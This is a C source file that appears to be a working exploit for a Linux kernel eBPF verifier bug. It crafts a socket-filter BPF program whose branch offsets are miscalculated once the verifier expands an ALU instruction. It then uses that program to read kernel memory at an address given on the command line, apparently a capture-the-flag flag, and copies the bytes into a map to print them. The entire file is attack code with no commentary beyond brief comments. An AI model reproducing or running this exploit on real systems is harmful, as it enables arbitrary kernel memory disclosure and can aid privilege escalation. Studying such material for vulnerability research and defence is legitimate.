#include <sys/syscall.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <pthread.h>
#include <sys/wait.h>
#include <linux/bpf.h>
#include <sys/mman.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <sys/socket.h>
#include <assert.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <stddef.h>

#define bpf_ldimm64_or_special(dst_reg, src_reg, imm) \
    bpf_insn(BPF_LD | BPF_DW | BPF_IMM, (dst_reg), (src_reg), 0, (imm) & 0xffffffff), \
    bpf_insn(0, 0, 0, 0, (uint64_t)(imm) >> 32)

#define bpf_load_imm64(dst_reg, imm) bpf_ldimm64_or_special(dst_reg, 0, imm)

// When src_reg == BPF_PSEUDO_MAP_FD, this loads the address of a map into a register
#define bpf_load_map(dst_reg, mapfd) bpf_ldimm64_or_special(dst_reg, BPF_PSEUDO_MAP_FD, mapfd)


#define LOG_BUF_SIZE 0x10000

static struct bpf_insn bpf_insn(uint8_t opcode, uint8_t dst_reg, uint8_t src_reg, int16_t off, int32_t imm)
{
  struct bpf_insn ret = {
    .code = opcode,
    .dst_reg = dst_reg,
    .src_reg = src_reg,
    .off = off,
    .imm = imm,
  };

  return ret;
}

static struct bpf_insn bpf_load_imm32(uint8_t dst_reg, int32_t imm)
{
  return bpf_insn(BPF_ALU64 | BPF_MOV | BPF_K, dst_reg, 0, 0, imm);
}

static struct bpf_insn bpf_exit(void)
{
  return bpf_insn(BPF_JMP | BPF_EXIT, 0, 0, 0, 0);
}

static struct bpf_insn bpf_xor_imm32(uint8_t dst_reg, int32_t imm)
{
  return bpf_insn(BPF_ALU64 | BPF_XOR | BPF_K, dst_reg, 0, 0, imm);
}

static struct bpf_insn bpf_xor_reg(uint8_t dst_reg, uint8_t src_reg)
{
  return bpf_insn(BPF_ALU64 | BPF_XOR | BPF_X, dst_reg, src_reg, 0, 0);
}

static struct bpf_insn bpf_add_imm32(uint8_t dst_reg, int32_t imm)
{
  return bpf_insn(BPF_ALU64 | BPF_ADD | BPF_K, dst_reg, 0, 0, imm);
}

static struct bpf_insn bpf_add_reg_reg(uint8_t dst_reg, uint8_t src_reg) {
    return bpf_insn(BPF_ALU64 | BPF_ADD | BPF_X, dst_reg, src_reg, 0, 0);
}

static struct bpf_insn bpf_sub_reg64(uint8_t dst_reg, uint8_t src_reg)
{
  return bpf_insn(BPF_ALU64 | BPF_SUB | BPF_X, dst_reg, src_reg, 0, 0);
}

static struct bpf_insn bpf_mov_reg_reg(uint8_t dst_reg, uint8_t src_reg)
{
  return bpf_insn(BPF_ALU64 | BPF_MOV | BPF_X, dst_reg, src_reg, 0, 0);
}

static struct bpf_insn bpf_call(int32_t function)
{
  return bpf_insn(BPF_JMP | BPF_CALL, 0, 0, 0, function);
}

static struct bpf_insn bpf_jne_imm(uint8_t reg, int16_t dest, int32_t imm)
{
  return bpf_insn(BPF_JMP | BPF_JNE | BPF_K, reg, 0, dest, imm);
}

static struct bpf_insn bpf_jle_imm(uint8_t reg, uint16_t dest, int32_t imm) {
    return bpf_insn(BPF_JMP | BPF_JLE | BPF_K, reg, 0, dest, imm);
}

// *(int32_t *)(base + offset) = imm
static struct bpf_insn bpf_store_imm32(uint8_t base, int16_t offset, int32_t imm)
{
  return bpf_insn(BPF_MEM | BPF_ST | BPF_W, base, 0, offset, imm);
}


// dst = *(uint64_t *)(base + offset)
static struct bpf_insn bpf_load_reg64(uint8_t dst, uint8_t base, int16_t offset)
{
  return bpf_insn(BPF_MEM | BPF_LDX | BPF_DW, dst, base, offset, 0);
}

// *(uint64_t *)(base + offset) = src
static struct bpf_insn bpf_store_reg64(uint8_t base, int16_t offset, uint8_t src)
{
  return bpf_insn(BPF_MEM | BPF_STX | BPF_DW, base, src, offset, 0);
}



int map_fd;

int bpf(enum bpf_cmd cmd, union bpf_attr *attr, unsigned int size)
{
    return syscall(__NR_bpf, cmd, attr, size);
}


int bpf_create_map(enum bpf_map_type map_type,
		 unsigned int key_size,
		 unsigned int value_size,
		 unsigned int max_entries)
{
	union bpf_attr attr = {
	  .map_type    = map_type,
	  .key_size    = key_size,
	  .value_size  = value_size,
	  .max_entries = max_entries
	};

	return bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
}

#define __NR_BPF 321
#define ptr_to_u64(ptr) ((__u64)(unsigned long)(ptr))

int bpf_lookup_elem(int fd, const void *key, void *value)
{
	union bpf_attr attr = {
		.map_fd = fd,
		.key = ptr_to_u64(key),
		.value = ptr_to_u64(value),
	};

	return syscall(__NR_BPF, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}

int
  bpf_update_elem(int fd, const void *key, const void *value,
		  uint64_t flags)
{
      union bpf_attr attr = {
	  .map_fd = fd,
	  .key    = key,
	  .value  = value,
	  .flags  = flags,
      };

      return bpf(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

char bpf_log_buf[LOG_BUF_SIZE];

static int load_prog(const struct bpf_insn *instructions, size_t size)
{
  union bpf_attr attr = {
    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
    .insns = (uint64_t)instructions,
    .insn_cnt = size,
    .license = (uint64_t)"GPL",
    .log_level = 2,
    .log_buf = (uint64_t)bpf_log_buf,
    .log_size = LOG_BUF_SIZE,
  };

  int ret = syscall(SYS_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
  if (ret < 0) {
    printf("Verifier returned %d, log: %s\n", ret, bpf_log_buf);
  }
  return ret;
}


int main(int argc, char *argv[]) {
    
    map_fd = bpf_create_map(BPF_MAP_TYPE_ARRAY
            ,sizeof(int)
            ,0x40
            ,0x10);

	printf("MAP FD: %d\n", map_fd);
    
     
    unsigned long flag;
    flag = argv[1] ? strtoul(argv[1], 0, 16) : 0xffffffff81d58000;
    
    const struct bpf_insn instructions[]  = {
        bpf_load_map(BPF_REG_1, map_fd),
        bpf_store_imm32(BPF_REG_10, -4, 0),
        bpf_mov_reg_reg(BPF_REG_2, BPF_REG_10),
        bpf_add_imm32(BPF_REG_2, -4),
        bpf_call(BPF_FUNC_map_lookup_elem),
        bpf_jne_imm(BPF_REG_0, 1, 0),
        bpf_exit(),
        bpf_load_reg64(BPF_REG_7, BPF_REG_0, 0),
        bpf_mov_reg_reg(BPF_REG_3, BPF_REG_0),

        bpf_load_imm32(BPF_REG_2, 0x10),
        bpf_load_imm64(BPF_REG_0, flag),
        bpf_jne_imm(BPF_REG_2, 21, -1), // JMP A
        bpf_load_imm32(BPF_REG_0, 0),
        bpf_exit(),

        //B
        bpf_mov_reg_reg(BPF_REG_0, BPF_REG_3),
        bpf_mov_reg_reg(BPF_REG_7, BPF_REG_7),
        bpf_mov_reg_reg(BPF_REG_7, BPF_REG_7),
        bpf_mov_reg_reg(BPF_REG_7, BPF_REG_7),
        bpf_mov_reg_reg(BPF_REG_7, BPF_REG_7),
        bpf_mov_reg_reg(BPF_REG_7, BPF_REG_7),

        // The most important ins is here, it will be expanded
        // to 7 instructions and delta will not be adjusted correctly.
        bpf_add_reg_reg(BPF_REG_0, BPF_REG_7),
        // BPF_MOV32_IMM(BPF_REG_AX, aux->alu_limit),
		// BPF_ALU64_REG(BPF_SUB, BPF_REG_AX, BPF_REG_7),
		// BPF_ALU64_REG(BPF_OR, BPF_REG_AX, BPF_REG_7),
		// BPF_ALU64_IMM(BPF_NEG, BPF_REG_AX, 0),
		// BPF_ALU64_IMM(BPF_ARSH, BPF_REG_AX, 63),
		// BPF_ALU64_REG(BPF_AND, BPF_REG_AX, BPF_REG_7),
		// BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_AX),
        //
        
        
        bpf_load_reg64(BPF_REG_8, BPF_REG_0, 0x0),
        bpf_store_reg64(BPF_REG_3, 0, BPF_REG_8),
        bpf_load_reg64(BPF_REG_8, BPF_REG_0, 0x8),
        bpf_store_reg64(BPF_REG_3, 0x8, BPF_REG_8),
        bpf_load_reg64(BPF_REG_8, BPF_REG_0, 0x10),
        bpf_store_reg64(BPF_REG_3, 0x10, BPF_REG_8),
        bpf_load_reg64(BPF_REG_8, BPF_REG_0, 0x18),
        bpf_store_reg64(BPF_REG_3, 0x18, BPF_REG_8),
        bpf_load_reg64(BPF_REG_8, BPF_REG_0, 0x20),
        bpf_store_reg64(BPF_REG_3, 0x20, BPF_REG_8),

        bpf_load_imm32(BPF_REG_0, 0x0),
		bpf_exit(),

        //A
		bpf_jle_imm(BPF_REG_7, -20, 5), // jmp B

        bpf_load_imm32(BPF_REG_0, 0),
        bpf_exit(),
        

     };

    int progfd = load_prog(instructions, sizeof(instructions)/sizeof(instructions[0]));
	if(progfd < 0) {
		printf("Something went wrong!\n");
		exit(progfd);
	}

	int sockets[2];

	socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets);
	setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd));
	write(sockets[0], "MAHER", 5);
    
    uint64_t key = 0;
    char buf[0x40];
    bpf_lookup_elem(map_fd, &key, &buf);
    printf("%s\n", buf);
}


